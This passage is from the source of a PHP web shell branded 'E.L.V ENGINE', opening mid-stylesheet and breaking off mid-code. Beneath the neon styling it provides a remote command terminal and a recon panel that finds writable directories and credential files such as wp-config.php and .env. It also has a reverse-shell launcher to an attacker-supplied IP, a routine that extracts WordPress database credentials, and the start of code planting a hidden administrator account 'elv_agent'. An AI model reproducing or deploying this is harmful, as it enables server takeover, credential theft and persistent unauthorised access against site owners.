            padding: 12px; 
            margin-bottom: 14px; 
            text-align: center; 
            border-radius: 4px; 
            font-size: 13px; 
            box-shadow: var(--glow-purple); 
        }
        .elv-neon-panel { 
            background: rgba(255,255,255,0.03); 
            border: 1px solid var(--border-subtle); 
            border-radius: 8px; 
            padding: 12px; 
            margin-bottom: 16px; 
            box-shadow: 0 0 20px rgba(138,43,226,0.05); 
            position: relative; 
            overflow: hidden; 
        }
        .elv-neon-panel::before { 
            content: ''; 
            position: absolute; 
            top: -1px; left: -1px; right: -1px; bottom: -1px; 
            border-radius: 8px; 
            background: linear-gradient(45deg, var(--neon-pink), var(--neon-purple), var(--neon-cyan), var(--neon-yellow), var(--neon-pink)); 
            background-size: 400% 400%; 
            z-index: -1; 
            animation: border-disco 4s linear infinite; 
            opacity: 0.12; 
        }
        @keyframes border-disco { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
        .glass-top-icons { display: flex; justify-content: space-evenly; align-items: center; width: 100%; gap: 10px; flex-wrap: wrap; position: relative; z-index: 2; }
        .glass-icon-btn { 
            color: var(--neon-cyan); 
            font-size: 36px; 
            text-decoration: none; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            transition: all 0.3s ease; 
            filter: drop-shadow(0 0 4px rgba(0,229,255,0.15)); 
            cursor: pointer; 
        }
        .glass-icon-btn:hover { 
            transform: scale(1.12); 
            filter: drop-shadow(0 0 10px var(--neon-magenta)); 
            color: var(--neon-magenta) !important; 
        }
        .label-txt { 
            font-size: 10px; 
            font-weight: 700; 
            margin-top: 4px; 
            color: var(--text-secondary); 
            letter-spacing: 1.5px; 
            text-transform: uppercase; 
        }
        .ascii-nav-btn { 
            text-decoration: none; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            padding: 6px 14px; 
            border: 2px solid var(--border-subtle); 
            background: rgba(255,255,255,0.03); 
            border-radius: 6px; 
            cursor: pointer; 
            transition: all 0.3s ease; 
            animation: ascii-border-disco 3s linear infinite; 
        }
        @keyframes ascii-border-disco { 
            0% { border-color: var(--neon-purple); box-shadow: 0 0 5px var(--neon-purple); } 
            25% { border-color: var(--neon-pink); box-shadow: 0 0 5px var(--neon-pink); } 
            50% { border-color: var(--neon-cyan); box-shadow: 0 0 5px var(--neon-cyan); } 
            75% { border-color: var(--neon-magenta); box-shadow: 0 0 5px var(--neon-magenta); } 
            100% { border-color: var(--neon-purple); box-shadow: 0 0 5px var(--neon-purple); } 
        }
        .ascii-nav-btn:hover { 
            transform: scale(1.06); 
            background: rgba(255,255,255,0.06); 
            animation: none; 
            border-color: var(--neon-magenta) !important; 
            box-shadow: 0 0 15px var(--neon-magenta) !important; 
        }
        .ascii-nav-btn pre { 
            margin: 0; 
            font-size: 5px; 
            line-height: 1.1; 
            font-weight: 700; 
            color: var(--neon-cyan); 
            text-shadow: 0 0 3px rgba(0,229,255,0.2); 
        }
        .ascii-nav-btn div { 
            font-size: 8px; 
            font-weight: 700; 
            letter-spacing: 2px; 
            margin-top: 4px; 
            color: var(--neon-pink); 
            text-shadow: 0 0 3px rgba(255,20,147,0.2); 
        }
        .cyber-tools-interface { 
            background: rgba(255,255,255,0.02); 
            border: 1px solid var(--border-subtle); 
            border-radius: 8px; 
            padding: 16px; 
            margin-bottom: 16px; 
        }
        .tools-title { 
            color: var(--neon-purple); 
            text-align: center; 
            text-shadow: 0 0 4px rgba(138,43,226,0.2); 
            letter-spacing: 3px; 
            margin: 0 0 16px 0; 
            font-size: 15px; 
            font-weight: 700; 
        }
        .tools-grid-cyber { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; }
        .cyber-tool-card { 
            background: rgba(255,255,255,0.02); 
            border: 1px solid var(--border-subtle); 
            border-radius: 6px; 
            padding: 12px; 
            text-decoration: none; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            text-align: center; 
            transition: all 0.3s ease; 
        }
        .cyber-tool-card:hover { 
            border-color: var(--neon-purple); 
            box-shadow: var(--glow-purple); 
            transform: translateY(-3px); 
            background: rgba(138,43,226,0.04); 
        }
        .icon-tool { font-size: 22px; margin-bottom: 8px; color: var(--neon-pink); text-shadow: 0 0 3px rgba(255,20,147,0.2); }
        .tool-text-gold-wrap { 
            background: rgba(255,255,255,0.02); 
            border: 1px solid rgba(138,43,226,0.1); 
            width: 100%; 
            padding: 6px; 
            border-radius: 4px; 
        }
        .tool-text-gold-wrap h3 { 
            margin: 0 0 3px 0; 
            font-size: 12px; 
            color: var(--neon-pink); 
            text-shadow: 0 0 3px rgba(255,20,147,0.2); 
            border-bottom: 1px solid rgba(138,43,226,0.08); 
            padding-bottom: 3px; 
        }
        .tool-text-gold-wrap p { margin: 0; font-size: 10px; color: var(--text-secondary); }
        .breadcrumb { 
            display: flex; 
            align-items: center; 
            background: rgba(255,255,255,0.03); 
            padding: 10px 12px; 
            margin-bottom: 14px; 
            border-left: 4px solid var(--neon-cyan); 
            overflow-x: auto; 
            white-space: nowrap; 
            border-radius: 4px; 
            font-size: 14px; 
        }
        .home-btn { color: var(--neon-cyan); text-decoration: none; font-weight: 700; transition: all 0.3s; cursor: pointer; font-size: 14px; }
        .home-btn:hover { color: var(--neon-purple); text-shadow: 0 0 8px rgba(138,43,226,0.25); }
        .breadcrumb a { color: var(--text-primary); text-decoration: none; font-weight: 700; font-size: 14px; transition: color 0.2s; }
        .breadcrumb a:hover { color: var(--neon-cyan); text-shadow: 0 0 4px rgba(0,229,255,0.2); }
        .breadcrumb span { color: var(--text-dim); margin: 0 6px; font-size: 14px; }
        .tools { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 14px; }
        .neon-cyan-box { 
            border: 1px solid var(--border-subtle); 
            background: rgba(255,255,255,0.02); 
            border-radius: 6px; 
            padding: 10px; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            transition: border-color 0.3s, box-shadow 0.3s; 
        }
        .neon-cyan-box:hover { border-color: var(--neon-cyan); box-shadow: var(--glow-cyan); }
        .btn-cyan-glow { 
            background: transparent; 
            border: 2px solid var(--neon-purple-dim); 
            color: var(--neon-purple); 
            font-weight: 700; 
            box-shadow: var(--glow-purple); 
            text-shadow: 0 0 3px rgba(138,43,226,0.2); 
            transition: all 0.3s ease; 
            cursor: pointer; 
            border-radius: 4px; 
            font-family: inherit; 
            text-transform: uppercase; 
            font-size: 10px; 
            padding: 8px 12px; 
        }
        .btn-cyan-glow:hover { 
            background: rgba(255,20,147,0.04); 
            border-color: var(--neon-cyan); 
            box-shadow: 0 0 12px var(--neon-magenta); 
            color: #eee; 
        }
        .btn-gray { 
            background: transparent; 
            color: var(--text-secondary); 
            border: 1px solid var(--border-subtle); 
            font-weight: 700; 
            border-radius: 3px; 
            cursor: pointer; 
            padding: 3px 6px; 
            font-size: 10px; 
            font-family: inherit; 
            transition: all 0.2s; 
        }
        .btn-gray:hover { border-color: var(--neon-cyan); color: var(--neon-cyan); }
        .btn-act-small { 
            background: transparent; 
            border: none; 
            color: var(--text-secondary); 
            cursor: pointer; 
            padding: 3px; 
            font-size: 13px; 
            transition: 0.2s; 
            margin: 0 2px; 
        }
        .btn-act-small:hover { transform: scale(1.2); }
        .act-dl:hover { color: var(--neon-cyan); text-shadow: 0 0 5px rgba(0,229,255,0.3); }
        .act-cp:hover { color: var(--neon-green); text-shadow: 0 0 5px rgba(0,255,136,0.3); }
        .act-del:hover { color: var(--neon-pink); text-shadow: 0 0 5px rgba(255,20,147,0.3); }
        .btn-editor-save { 
            border: 2px solid var(--neon-green-dim); 
            color: var(--neon-green); 
            background: transparent; 
            padding: 8px 16px; 
            font-weight: 700; 
            border-radius: 4px; 
            cursor: pointer; 
            font-family: inherit; 
            font-size: 12px; 
            text-transform: uppercase; 
            transition: all 0.3s; 
        }
        .btn-editor-save:hover { 
            background: rgba(0,255,136,0.04); 
            box-shadow: 0 0 12px rgba(0,255,136,0.15); 
        }
        .btn-editor-cancel { 
            border: 2px solid var(--neon-pink-dim); 
            color: var(--neon-pink); 
            background: transparent; 
            padding: 8px 16px; 
            font-weight: 700; 
            border-radius: 4px; 
            cursor: pointer; 
            font-family: inherit; 
            font-size: 12px; 
            text-transform: uppercase; 
            transition: all 0.3s; 
            text-decoration: none; 
            text-align: center; 
        }
        .btn-editor-cancel:hover { 
            background: rgba(255,20,147,0.04); 
            box-shadow: 0 0 12px rgba(255,20,147,0.15); 
        }
        input[type="file"] { 
            background: rgba(255,255,255,0.03); 
            border: 1px dashed var(--border-subtle); 
            color: var(--text-primary); 
            padding: 5px; 
            width: 100%; 
            border-radius: 4px; 
            cursor: pointer; 
            font-family: inherit; 
            font-size: 10px; 
            outline: none; 
        }
        input[type="file"]::file-selector-button { 
            background: rgba(255,255,255,0.05); 
            border: 1px solid var(--border-subtle); 
            color: var(--neon-purple); 
            padding: 4px 6px; 
            border-radius: 3px; 
            margin-right: 6px; 
            cursor: pointer; 
            font-size: 10px; 
            transition: all 0.2s; 
        }
        input[type="file"]::file-selector-button:hover { border-color: var(--neon-cyan); }
        input[type="text"], input[type="number"], textarea, select { 
            background: var(--bg-input); 
            border: 1px solid var(--border-subtle); 
            color: var(--text-primary); 
            padding: 8px; 
            width: 100%; 
            outline: none; 
            border-radius: 4px; 
            font-size: 12px; 
            font-family: inherit; 
            transition: border-color 0.3s, box-shadow 0.3s; 
        }
        input[type="text"]:focus, input[type="number"]:focus, textarea:focus, select:focus { 
            border-color: var(--neon-cyan); 
            box-shadow: 0 0 8px rgba(0,229,255,0.1); 
        }
        input[name="c_perm"] { 
            background: transparent; 
            border: none; 
            color: var(--neon-pink); 
            font-weight: 700; 
            font-size: 12px; 
            padding: 2px; 
            width: 36px; 
            text-align: center; 
        }
        .table-responsive { 
            width: 100%; 
            overflow-x: auto; 
            background: rgba(255,255,255,0.02); 
            border: 1px solid var(--border-subtle); 
            border-radius: 5px; 
        }
        table { width: 100%; border-collapse: collapse; min-width: 600px; font-size: 13px; }
        th { 
            text-align: left; 
            background: rgba(255,255,255,0.04); 
            color: var(--neon-cyan); 
            padding: 10px 14px; 
            font-size: 12px; 
            text-transform: uppercase; 
            letter-spacing: 1.5px; 
            border-bottom: 2px solid var(--border-subtle); 
            font-weight: 700; 
            text-shadow: 0 0 3px rgba(0,229,255,0.15); 
        }
        td { padding: 8px 14px; border-bottom: 1px solid rgba(255,255,255,0.03); vertical-align: middle; color: var(--text-primary); font-size: 13px; }
        .item-t { 
            text-decoration: none; 
            font-weight: 700; 
            font-size: 15px; 
            transition: color 0.2s, text-shadow 0.2s; 
        }
        .item-t[data-writable="1"] { color: var(--neon-green) !important; text-shadow: 0 0 3px rgba(0,255,136,0.2); }
        .item-t[data-writable="0"] { color: var(--neon-pink) !important; text-shadow: 0 0 3px rgba(255,20,147,0.2); }
        .item-t:hover { color: var(--neon-cyan) !important; text-shadow: 0 0 5px rgba(0,229,255,0.3); }
        .dir-label { font-weight: 700; margin-right: 3px; font-size: 15px; }
        .dir-label[data-type="dir"] { color: var(--neon-magenta); text-shadow: 0 0 3px rgba(255,0,255,0.2); }
        .dir-label[data-type="file"] { color: var(--neon-cyan); text-shadow: 0 0 3px rgba(0,229,255,0.2); }
        .chmod-writable { color: var(--neon-green) !important; text-shadow: 0 0 3px rgba(0,255,136,0.2); }
        .chmod-nonwritable { color: var(--neon-pink) !important; text-shadow: 0 0 3px rgba(255,20,147,0.2); }
        .col-size { width: 80px; color: var(--text-secondary); font-size: 12px; }
        .col-chmod { width: 80px; font-size: 12px; }
        .col-act { text-align: right; width: 160px; white-space: nowrap; }
        .console { 
            background: rgba(255,255,255,0.04); 
            color: var(--neon-green); 
            padding: 14px; 
            border: 1px solid var(--border-subtle); 
            font-size: 12px; 
            min-height: 100px; 
            overflow-y: auto; 
            margin-bottom: 10px; 
            border-top: 3px solid var(--neon-cyan); 
            white-space: pre-wrap; 
            border-radius: 4px; 
            font-family: inherit;
            text-shadow: 0 0 4px rgba(0,255,136,0.15);
        }
        .console pre { 
            color: var(--neon-green); 
            margin: 0; 
            font-size: 12px;
            text-shadow: 0 0 4px rgba(0,255,136,0.15);
        }
        .console .cmd-output { color: var(--neon-cyan); }
        .console .cmd-prompt { color: var(--neon-magenta); font-weight: 700; }
        
        .cyber-term-box { 
            background: rgba(255,255,255,0.02); 
            border: 1px solid var(--border-subtle); 
            border-radius: 6px; 
            padding: 16px; 
            display: flex; 
            flex-direction: column; 
        }
        .cyber-input-wrapper { 
            display: flex; 
            align-items: center; 
            background: rgba(255,255,255,0.03); 
            border-left: 4px solid var(--neon-cyan); 
            padding: 12px; 
            margin-bottom: 12px; 
            transition: border-color 0.3s; 
        }
        .cyber-input-wrapper:focus-within { border-left-color: var(--neon-magenta); }
        .cyber-cmd-prompt { 
            color: var(--neon-magenta); 
            font-weight: 700; 
            margin-right: 12px; 
            text-shadow: 0 0 3px rgba(255,0,255,0.2); 
            font-size: 14px; 
            white-space: nowrap; 
        }
        .cyber-cmd-input { 
            background: transparent !important; 
            border: none !important; 
            color: var(--text-primary) !important; 
            width: 100%; 
            font-family: inherit; 
            font-size: 14px !important; 
            outline: none; 
            padding: 0 !important; 
        }
        .cyber-cmd-input::placeholder { color: rgba(224,224,255,0.1); }
        .cyber-exec-btn { 
            background: transparent; 
            border: 2px solid var(--neon-purple-dim); 
            color: var(--neon-purple); 
            padding: 12px; 
            width: 100%; 
            font-family: inherit; 
            font-weight: 700; 
            font-size: 13px; 
            text-transform: uppercase; 
            letter-spacing: 3px; 
            cursor: pointer; 
            transition: all 0.3s; 
            text-shadow: 0 0 3px rgba(138,43,226,0.2); 
        }
        .cyber-exec-btn:hover { 
            background: rgba(255,20,147,0.04); 
            color: #eee; 
            border-color: var(--neon-magenta); 
            box-shadow: 0 0 12px var(--neon-magenta); 
        }
        
        .CodeMirror { 
            height: auto; 
            min-height: 400px; 
            font-size: 12px; 
            border-radius: 4px; 
            border: 1px solid var(--border-subtle); 
            font-family: 'Share Tech Mono', monospace !important; 
        }
        .card-autoroot { border-color: var(--neon-purple) !important; }
        .card-recon { border-color: var(--neon-cyan) !important; }
        .card-wpadmin { border-color: var(--neon-green) !important; }
        .card-revshell { border-color: var(--neon-magenta) !important; }
        .card-mass { border-color: var(--neon-yellow) !important; }
        .card-bypass406 { border-color: var(--neon-orange) !important; }
        
        .glow-static { 
            text-align: center; 
            margin-top: 24px; 
            padding-bottom: 16px; 
            color: var(--text-dim); 
            font-size: 10px; 
        }
        .notif-success {
            color: var(--neon-green);
            border: 1px solid var(--neon-green);
            background: rgba(0, 255, 136, 0.05);
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            font-weight: bold;
            text-shadow: 0 0 8px rgba(0, 255, 136, 0.5);
            box-shadow: 0 0 10px rgba(0, 255, 136, 0.1);
            display: block;
        }
        
        @media (max-width: 600px) { 
            .hud-grid { grid-template-columns: repeat(2, 1fr); } 
            .tools { grid-template-columns: 1fr; } 
            .container { padding: 10px; } 
            .header { flex-wrap: wrap; gap: 8px; } 
            .glass-icon-btn { font-size: 28px; } 
            .ascii-nav-btn { padding: 4px 10px; } 
            .ascii-nav-btn pre { font-size: 3px; } 
        }
        @media (min-width: 768px) { 
            .hud-grid { grid-template-columns: repeat(4, 1fr); } 
            .tools { grid-template-columns: repeat(3, 1fr); } 
        }
    </style>
</head>
<body>
    <canvas id="terminal-bg"></canvas>
    <div class="container">
<!-- ===== HEADER ===== -->
        <div class="header">
            <div class="header-brand"> 
                <div style="width:85px; height:85px; border:2px solid var(--neon-cyan); border-radius:50%; box-shadow:0 0 25px rgba(0,229,255,0.5); background:linear-gradient(135deg, #0d021a, #1a0533); display:flex; align-items:center; justify-content:center; overflow:hidden; padding:5px; flex-shrink:0;">
                    <img src="<?= $logo_inner ?>" style="width:100%; height:100%; object-fit:contain; filter:drop-shadow(0 0 10px rgba(0,229,255,0.4));" alt="ELV">
                </div>
                <div class="brand-text" style="display:flex; flex-direction:column; align-items:flex-start; margin-left:8px;">
                    <div class="brand-title" style="color:var(--neon-cyan); font-size:10px; font-weight:700; text-shadow:0 0 3px rgba(0,229,255,0.2); letter-spacing:1px; margin-bottom:2px; opacity:0.7;"> [ HxN | 2026 © ] </div>
                    <div class="brand-sub">
                        <img src="https://d.top4top.io/p_3839nayyc0.png" 
                             style="height:65px; width:auto; vertical-align:middle; filter:drop-shadow(0 0 12px rgba(0,238,255,0.8)); display:inline-block;" 
                             alt="Logo">
                    </div>
                </div>
            </div>
            <div class="header-actions">
                <a href="?logout=1" class="btn-logout-top">LOGOUT [X]</a>
            </div>
        </div>
        
        <!-- ===== NEON DIVIDER ===== -->
        <div class="neon-divider"></div>
        
        <!-- ===== HUD GRID ===== -->
        <div class="hud-grid">
            <div class="hud-item"><b>[USER]</b><?= htmlspecialchars($u_info) ?></div>
            <div class="hud-item"><b>[SERVER]</b><?= htmlspecialchars(substr($s_soft, 0, 25)) ?></div>
            <div class="hud-item"><b>[IP ADDR]</b><?= htmlspecialchars($s_ip) ?></div>
            <div class="hud-item"><b>[PHP VER]</b><?= htmlspecialchars($php_v) ?></div>
            <div class="hud-item"><b>[KERNEL]</b><?= htmlspecialchars(substr($kernel, 0, 25)) ?></div>
            <div class="hud-item"><b>[UUID]</b><?= htmlspecialchars($uuid) ?></div>
            <div class="hud-item"><b>[DOC ROOT]</b><?= htmlspecialchars(substr($_SERVER['DOCUMENT_ROOT'], 0, 30)) ?></div>
            <div class="hud-item"><b>[DISABLED]</b><?= htmlspecialchars(substr($dis_func,0,20)) ?></div>
        </div>
        
        <?php if($status_msg): ?>
            <div class="notif-success"><?= $status_msg ?></div>
            <script>
                setTimeout(function(){
                    var notif = document.querySelector('.notif-success');
                    if(notif) notif.style.display = 'none';
                }, 5000);
            </script>
        <?php endif; ?>
        
        <!-- ===== NAV PANEL ===== -->
        <div class="neon-divider-thin"></div>
        <div class="elv-neon-panel">
            <div class="glass-top-icons">
                <a href="?d=<?= urlencode($dir) ?>" class="glass-icon-btn" title="FILESYSTEM">
                    <i class="fa-regular fa-folder-open"></i>
                    <span class="label-txt">FILE</span>
                </a>
                <a href="?d=<?= urlencode($dir) ?>&mode=elv_tools" class="ascii-nav-btn" title="E.L.V ENGINE TOOLS">
<pre>
███████╗ ██╗      ██╗  ██╗
██╔════╝ ██║      ██║  ██║
█████╗   ██║      ██║  ██║
██╔══╝   ██║      ╚██╗██╔╝
███████╗ ███████╗  ╚███╔╝ 
╚══════╝ ╚══════╝   ╚══╝</pre>
                    <div>[ ENGINE ]</div>
                </a>
                <a href="?d=<?= urlencode($dir) ?>&mode=terminal" class="glass-icon-btn" title="TERMINAL">
                    <i class="fa-solid fa-terminal"></i>
                    <span class="label-txt">TERMINAL</span>
                </a>
            </div>
        </div>
        
        <div class="neon-divider-thin"></div>
        
        <?php 
        // ==========================================
        // --- MODE: ELV TOOLS ---
        // ==========================================
        if(@$_GET['mode'] == 'elv_tools') { ?>
            <div class="cyber-tools-interface">
                <h2 class="tools-title">[ E.L.V ENGINE ® v13.0 ]</h2>
                <div class="neon-divider-thin"></div>
                <div class="tools-grid-cyber">
                    <a href="?d=<?= urlencode($dir) ?>&autoroot=1" class="cyber-tool-card card-autoroot">
                        <i class="fa-solid fa-bolt icon-tool"></i>
                        <div class="tool-text-gold-wrap">
                            <h3>AUTO ROOT EXPLOIT</h3>
                            <p>Automated SUID privilege escalation scan.</p>
                        </div>
                    </a>
                    <a href="?d=<?= urlencode($dir) ?>&semiauto=1" class="cyber-tool-card card-recon">
                        <i class="fa-solid fa-radar icon-tool"></i>
                        <div class="tool-text-gold-wrap">
                            <h3>SEMI AUTO RECON</h3>
                            <p>Writable dirs & sensitive file scanner.</p>
                        </div>
                    </a>
                    <a href="?d=<?= urlencode($dir) ?>&wpbypass=1" class="cyber-tool-card card-wpadmin">
                        <i class="fa-brands fa-wordpress icon-tool"></i>
                        <div class="tool-text-gold-wrap">
                            <h3>WP ADMIN BYPASS</h3>
                            <p>Direct access to WordPress Dashboard.</p>
                        </div>
                    </a>
                    <a href="?d=<?= urlencode($dir) ?>&revshell=1" class="cyber-tool-card card-revshell">
                        <i class="fa-solid fa-network-wired icon-tool"></i>
                        <div class="tool-text-gold-wrap">
                            <h3>REVERSE SHELL</h3>
                            <p>Tactical backdoor connection to listener.</p>
                        </div>
                    </a>
                    <a href="?d=<?= urlencode($dir) ?>&mode=mass" class="cyber-tool-card card-mass">
                        <i class="fa-solid fa-truck-fast icon-tool"></i>
                        <div class="tool-text-gold-wrap">
                            <h3>MASS DEPLOYMENT</h3>
                            <p>Deploy payload across multiple target sectors.</p>
                        </div>
                    </a>
                    <a href="?d=<?= urlencode($dir) ?>&mode=bypass406" class="cyber-tool-card card-bypass406">
                        <i class="fa-solid fa-truck-ramp-box icon-tool"></i>
                        <div class="tool-text-gold-wrap">
                            <h3>406 BYPASS UPLOAD</h3>
                            <p>Stealth Base64 writer & Remote Grabber.</p>
                        </div>
                    </a>
                </div>
            </div>
        <?php }
        // ==========================================
        // --- MODE: TERMINAL ---
        // ==========================================
        elseif(@$_GET['mode'] == 'terminal') { ?>
            <div class="cyber-tools-interface">
                <h2 class="tools-title">[ TACTICAL SYSTEM TERMINAL ]</h2>
                <div class="neon-divider-thin"></div>
                <div class="cyber-term-box">
                    <form method="post" action="?d=<?= urlencode($dir) ?>&mode=terminal" style="display:flex; flex-direction:column; flex-grow:1;">
                        <div class="cyber-input-wrapper">
                            <span class="cyber-cmd-prompt">HxN×E.L.V:~#</span>
                            <input type="text" name="cmd" class="cyber-cmd-input" placeholder="_type_command_here..." autofocus autocomplete="off">
                        </div>
                        <button type="submit" class="cyber-exec-btn">EXECUTE COMMAND</button>
                    </form>
                    <?php if ($out || isset($_POST['cmd'])): ?>
                        <div class="console" style="margin-top:16px; max-height:350px; overflow-y:auto;">
                            <pre><?= htmlspecialchars($out) ?></pre>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        <?php }
        // ==========================================
        // --- MODE: AUTO ROOT ---
        // ==========================================
        elseif(isset($_GET['autoroot']) && $_GET['autoroot'] == '1'){ ?>
            <div style="border:2px solid var(--neon-purple); text-align:center; padding:20px; background:rgba(255,255,255,0.04); border-radius:6px;">
                <h3 style="color:var(--neon-purple); margin-top:0; text-shadow:0 0 6px rgba(170,0,255,0.3);">EXECUTE AUTOMATED ROOT SCAN & EXPLOIT?</h3>
                <div style="display:flex; justify-content:center; gap:15px; margin-top:15px;">
                    <a href="?d=<?= urlencode($dir) ?>&autoroot=exec" style="color:var(--neon-cyan); font-weight:700; padding:10px 25px; border:2px solid var(--neon-cyan-dim); text-decoration:none; border-radius:4px; transition:all 0.3s; box-shadow:var(--glow-cyan);">[ YES ]</a>
                    <a href="?d=<?= urlencode($dir) ?>" style="color:var(--neon-magenta); font-weight:700; padding:10px 25px; border:2px solid var(--neon-pink-dim); text-decoration:none; border-radius:4px; transition:all 0.3s; box-shadow:var(--glow-magenta);">[ NO ]</a>
                </div>
            </div>
        <?php }
        // ==========================================
        // --- MODE: SEMI AUTO RECON ---
        // ==========================================
        elseif(isset($_GET['semiauto'])) { ?>
            <div class="console" style="border-top-color:var(--neon-cyan);">
                <h3 style="color:var(--neon-cyan); margin-top:0; text-align:center; text-shadow:0 0 6px rgba(0,255,136,0.3);">[ SEMI-AUTO RECON & JUMP ]</h3>
                <div class="neon-divider-thin"></div>
                <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap:15px; margin-top:15px;">
                    <div style="border:1px dashed var(--neon-cyan); padding:10px; background:rgba(255,255,255,0.04); border-radius:4px;">
                        <b style="color:var(--neon-cyan); display:block; margin-bottom:10px; text-align:center; text-shadow:0 0 3px rgba(0,255,136,0.2);">[ WRITABLE DIRECTORIES ]</b>
                        <?php
                        $scan_targets = ['/tmp' => 'TMP DIR', '/var/tmp' => 'VAR TMP', '/dev/shm' => 'DEV SHM', $dir => 'CURRENT DIR', $_SERVER['DOCUMENT_ROOT'] => 'DOC ROOT'];
                        $found_dir = false;
                        foreach($scan_targets as $path => $label) {
                            if(@is_writable($path)) { 
                                $found_dir = true;
                                echo '<a href="?d='.urlencode($path).'" style="display:block; border:1px solid var(--neon-cyan-dim); color:var(--neon-cyan); text-decoration:none; padding:8px; text-align:center; margin-bottom:5px; border-radius:3px; transition:all 0.2s; box-shadow:var(--glow-cyan);">JUMP &rarr; '.$label.'</a>'; 
                            }
                        }
                        if(!$found_dir) echo "<div style='text-align:center; color:var(--text-dim);'>NO WRITABLE DIR FOUND</div>";
                        ?>
                    </div>
                    <div style="border:1px dashed var(--neon-magenta); padding:10px; background:rgba(255,255,255,0.04); border-radius:4px;">
                        <b style="color:var(--neon-magenta); display:block; margin-bottom:10px; text-align:center; text-shadow:0 0 3px rgba(255,0,255,0.2);">[ TARGET SENSITIVE FILES ]</b>
                        <?php
                        $interesting_files = ['wp-config.php', 'configuration.php', '.env', 'config.php', 'database.php'];
                        $found_file = false;
                        foreach([$dir, dirname($dir), $_SERVER['DOCUMENT_ROOT']] as $base_scan) {
                            foreach($interesting_files as $ifile) {
                                $full_path = $base_scan . '/' . $ifile;
                                if(@file_exists($full_path) && @is_readable($full_path)) { 
                                    $found_file = true;
                                    echo '<a href="?edit='.urlencode($full_path).'&d='.urlencode($dir).'" style="display:block; border:1px solid var(--neon-magenta-dim); color:var(--neon-magenta); text-decoration:none; padding:8px; text-align:center; margin-bottom:5px; border-radius:3px; transition:all 0.2s; box-shadow:var(--glow-magenta);">EDIT &rarr; '.$ifile.'</a>'; 
                                }
                            }
                        }
                        if(!$found_file) echo "<div style='text-align:center; color:var(--text-dim);'>NO SENSITIVE FILES FOUND</div>";
                        ?>
                    </div>
                </div>
            </div>
        <?php } 
        // ==========================================
        // --- MODE: REVERSE SHELL ---
        // ==========================================
        elseif(isset($_GET['revshell'])) { ?>
            <div class="console" style="border-top-color:var(--neon-magenta);">
                <h3 style="color:var(--neon-magenta); margin-top:0; text-align:center; text-shadow:0 0 6px rgba(255,0,255,0.3);">[ TACTICAL REVERSE SHELL ]</h3>
                <div class="neon-divider-thin"></div>
                <form method="post" style="display:flex; flex-direction:column; gap:10px; margin-top:15px;">
                    <div style="display:flex; gap:10px;">
                        <input type="text" name="rev_ip" placeholder="LHOST / IP ATTACKER" required style="flex:2; border-color:var(--neon-magenta);">
                        <input type="number" name="rev_port" placeholder="LPORT" required style="flex:1; border-color:var(--neon-magenta);">
                    </div>
                    <button type="submit" name="launch_rev" style="color:var(--neon-magenta); width:100%; font-weight:700; letter-spacing:2px; font-size:14px; padding:15px; border:2px solid var(--neon-magenta-dim); background:transparent; cursor:pointer; border-radius:4px; transition:all 0.3s; box-shadow:var(--glow-magenta);">[ INITIATE CONNECTION ]</button>
                </form>
                <div style="margin-top:15px; font-size:11px; color:var(--text-dim); border:1px dashed var(--neon-magenta-dim); padding:10px; border-radius:4px;">
                    <span style="color:var(--neon-magenta); font-weight:bold;">[!] HOW TO USE:</span><br>
                    1. Buka listener di terminal lu: <code style="color:var(--neon-cyan);">nc -lvnp [PORT]</code><br>
                    2. Masukkan IP dan Port lu di atas, klik Initiate.<br>
                    3. Payload dieksekusi di background (Bash TCP Fork), web shell tidak akan hang.
                </div>
            </div>
        <?php } 
        // ==========================================
        // --- MODE: WP BYPASS ---
        // ==========================================
        elseif (isset($_GET['wpbypass'])) {
            $conf = $dir.'/wp-config.php';
            if(file_exists($conf)) {
                $get_conf = @file_get_contents($conf);
                preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $db);
                preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $user);
                preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $pass);
                preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $host);
                ?>
                <div class="console" style="border-top:3px solid var(--neon-cyan);">
<pre style="color:var(--neon-cyan);">
[[ E.L.V WP-BYPASS ENGINE v13.0 ]]
------------------------------------------
STATUS      : [ TARGET ACQUIRED ]
DB_NAME     : <?= htmlspecialchars(isset($db[1]) ? $db[1] : 'NOT_FOUND') ?>
DB_USER     : <?= htmlspecialchars(isset($user[1]) ? $user[1] : 'NOT_FOUND') ?>
DB_PASS     : <?= htmlspecialchars(isset($pass[1]) ? $pass[1] : 'NOT_FOUND') ?>
DB_HOST     : <?= htmlspecialchars(isset($host[1]) ? $host[1] : 'NOT_FOUND') ?>
------------------------------------------
[+] CONNECTION : STABLE
[+] SQL INJECT : ARMED
[+] BYPASS     : READY
------------------------------------------</pre>
<div class="neon-divider-thin"></div>
<a href="?d=<?= urlencode($dir) ?>&action=wp_bypass" style="color:var(--neon-cyan); border:2px solid var(--neon-cyan-dim); background:transparent; width:100%; text-decoration:none; text-align:center; display:block; padding:15px; font-size:14px; font-weight:700; border-radius:4px; transition:all 0.3s; box-shadow:var(--glow-cyan);">[ LAUNCH EXPLOIT: AUTO LOGIN ADMIN ]</a>
                </div>
                <?php
            } else { echo '<div class="alert" style="border-color:var(--neon-magenta); color:var(--neon-magenta);">[-] ERROR: wp-config.php NOT DETECTED IN THIS SECTOR.</div>'; }
        }
        // ==========================================
        // --- ACTION: WP BYPASS EXECUTE ---
        // ==========================================
        elseif(isset($_GET['action']) && $_GET['action'] == 'wp_bypass') {
            $bypass_msg = '';
            $wp_load_path = $dir . '/wp-load.php';
            if (file_exists($wp_load_path)) {
                require_once($wp_load_path);
                $new_user = array(
                    'user_login' => 'elv_agent',
